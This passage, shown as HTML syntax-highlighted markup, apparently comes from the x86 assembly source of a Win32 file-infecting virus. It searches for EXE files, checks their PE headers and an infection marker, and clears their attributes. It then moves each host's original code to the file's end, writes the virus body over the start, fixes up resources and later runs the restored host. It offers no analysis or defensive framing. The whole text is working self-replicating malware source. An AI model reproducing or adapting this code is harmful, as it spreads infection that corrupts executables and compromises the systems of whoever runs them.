        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_critical_temp</span><span class="sc0">              </span><span class="sc1">; eax map handle</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; mapping handle</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapViewOfFile</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; mapping handle</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_critical_temp</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_virus_p</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">exesize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; size</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">f_shit</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">first_generation</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; map handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; to beginning of file mapping in mem</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; restore original</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; now we must restore the resources</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; on PE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; resources lenght</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_resourz</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">88h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; resources RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc0">                    </span><span class="sc1">; to objects</span><span class="sc0">
</span><span class="sc5">srs_loo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; is the resources one?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_srsr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                         </span><span class="sc1">; lenght of an object</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">srs_loo</span><span class="sc0">
</span><span class="sc5">got_srsr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; physical offset of resources</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">                       </span><span class="sc1">; fixed virus resources RVA</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rsrs_change</span><span class="sc0">                     </span><span class="sc1">; call changer</span><span class="sc0">

</span><span class="sc5">no_resourz</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; everything is ready again</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">v_file_handle</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; close virus file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">process_info</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startup_info</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">         </span><span class="sc1">; to command line options</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tmp_name</span><span class="sc0">         </span><span class="sc1">; to file to execute</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateProcessA</span><span class="sc0">          </span><span class="sc1">; run host executable</span><span class="sc0">

</span><span class="sc5">first_generation</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">author</span><span class="sc0">           </span><span class="sc1">; name of the mutex object</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateMutexA</span><span class="sc0">            </span><span class="sc1">; create one</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetLastError</span><span class="sc0">            </span><span class="sc1">; check if one with the same name</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; already exist. if so virus is already</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">exit_critical_temp</span><span class="sc0">      </span><span class="sc1">; running as another process</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exemask</span><span class="sc0">

</span><span class="sc5">search_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fsearch</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0">          </span><span class="sc1">; search for some victims</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">end_file_search</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ff_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">path_position</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; copy found file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcpy</span><span class="sc0">                                 </span><span class="sc1">; after directory</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">                             </span><span class="sc1">; FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFileAttributesA</span><span class="sc0">              </span><span class="sc1">; delete attributes</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">error_attributes</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0c0000000h</span><span class="sc0">                      </span><span class="sc1">; readwrite</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_path</span><span class="sc0">                 </span><span class="sc1">; full file name to file to</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">                     </span><span class="sc1">; infect</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">error_opening</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">f_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_virus_p</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; virus heap</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">exesize</span><span class="sc0">                     </span><span class="sc1">; read data is after original</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">f_size_hi</span><span class="sc0">                </span><span class="sc1">; some place to store nr of</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">read_exe</span><span class="sc0">                        </span><span class="sc1">; readed bytes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadFile</span><span class="sc0">                        </span><span class="sc1">; read header</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">             </span><span class="sc1">; exe?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_to_infect</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; pointer to PE header</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">read_exe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; is the PE header in readed</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">not_to_infect</span><span class="sc0">                   </span><span class="sc1">; chunk of executable?</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_to_infect</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc5">marker</span><span class="sc0">      </span><span class="sc1">; already infected?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_to_infect</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],(</span><span class="sc5">file_align</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_to_infect</span><span class="sc0">                   </span><span class="sc1">; must have an align cmptible</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">f_size_lo</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; file size (assume &lt;= 4gb)</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">; not too small files</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">not_to_infect</span><span class="sc0">           </span><span class="sc1">; leave it</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; resource size</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_resp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">88h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; pointer to resources</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,(</span><span class="sc2">0f8h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">search_rsrcs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; is the resources one?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_rsrcs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                         </span><span class="sc1">; lenght of an object</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">search_rsrcs</span><span class="sc0">
</span><span class="sc5">got_rsrcs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">                         </span><span class="sc1">; on beginning of this object</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc5">exesize</span><span class="sc0">     </span><span class="sc1">; are resources after the virus</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">not_to_infect</span><span class="sc0">                   </span><span class="sc1">; size (this is won't be overw)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">no_resp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_point</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">exesize</span><span class="sc0">             </span><span class="sc1">; will extend it by exesize</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">not_to_infect</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">v_map_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapViewOfFile</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close_map_exit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">f_size_lo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">exesize</span><span class="sc0">             </span><span class="sc1">; save original code after the end</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_virus_p</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; on vir</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">; copy virus body</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; on PE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">               </span><span class="sc1">; image size of virus file w/o rsrcs</span><span class="sc0">
